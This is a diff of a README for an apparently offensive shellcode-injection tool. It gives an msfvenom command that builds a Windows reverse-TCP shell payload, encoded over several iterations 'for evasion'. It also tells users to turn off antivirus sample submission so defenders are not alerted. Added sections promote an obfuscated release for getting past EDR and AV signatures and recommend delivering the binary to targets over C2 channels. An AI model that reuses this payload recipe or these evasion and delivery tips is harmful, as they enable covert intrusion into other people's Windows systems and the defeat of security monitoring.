@@ -69,9 +69,11 @@ We suggest to use directly compiled executables as in some situations it depends
 
 ## :warning: Note - Sometimes you have to Re-run the program because of Memory Issues. But do not worry, You'll get the shell on Re-run !!!  :nazar_amulet:
 
+### Recommended to Turn-Off "Automatic Sample Submission" If you can or using in the testing environment.
+
 ***1. Generate a .bin file only - You can use C2 servers and metasploit too or any you want***
 
-Example - msfvenom -p windows/x64/shell_reverse_tcp LHOST=< IP > LPORT=< PORT > -f raw -i < iterations as you want for evasion > -e < encoder you want to use > > shell.bin - **x64-Bit**
+### Example - msfvenom -p windows/x64/shell_reverse_tcp LHOST=< IP > LPORT=< PORT > -f raw -i < iterations as you want for evasion > -e < encoder you want to use > > shell.bin - **x64-Bit**
   
  **2. Obfuscation is mainly your work to do as per your operation's requirement and the other one's? - WE'LL HANDLE!!!**
   
@@ -83,4 +85,15 @@ Example - msfvenom -p windows/x64/shell_reverse_tcp LHOST=< IP > LPORT=< PORT > 
   
   ***6. If you're injecting to custom binary - It might fails due to Memory allocation issue , still depends on your Privilege and many 3rd
 level factors. But you can give it a try - In some cases it will work !! :nazar_amulet:***
-  
+
+***7. As we know EDR's and AV signatures keep updating, so we created an obfuscated release to assist you !!!***
+
+## **Keep few things in mind when using obfuscated release -**  
+
+* Never Directly Download Executable via Github on the target system, I found some bytes were missing + WindowsSmartScreen even mark genuine executables malicious too while downloading .EXE from Github. ( That's why Non-Malicious like WinPEAs , which is for PrivEsc too faces some windowsSmartScreen blockings ) 
+
+* Best way is to Download from Github to your Kali Linux or any Attacker Machine first and then transfer it to Target System via C2 Channels or any you like. ( Invoke-WebRequest too )
+
+* In this case you'll not face any problems regarding missing bytes or EDR. 
+
+* Sometimes you have to apply many other ways to Bypass EDR and there's not always be a Signature-Patch issue. But there might be a Feature or some Technical problems like missing bytes of the binary, which restricting us. 
